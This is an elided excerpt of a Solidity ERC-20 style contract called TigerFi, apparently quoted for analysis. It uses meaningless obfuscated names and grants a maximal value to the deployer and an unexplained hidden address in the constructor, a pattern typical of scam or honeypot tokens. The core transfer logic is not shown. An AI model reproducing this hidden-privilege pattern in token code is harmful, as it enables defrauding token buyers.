...
contract TigerFi is Ownable {
    constructor(
        ...
        torn = 9;
        red = 3;
        stronger[pleasant] = skin;
        stronger[msg.sender] = skin;
        _tTotal = 1000000000 * 10**torn;
        chose[msg.sender] = _tTotal;
    }

    uint256 public red;
    string private plenty;
    string private basic;
    uint8 private torn;
    ...
    uint256 private equally;
    address public uniswapV2Pair;
    uint256 private skin = ~_tTotal;
    ...
    function transferFrom(
        ...
        feathers(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        feathers(msg.sender, recipient, amount);
        return true;
    }
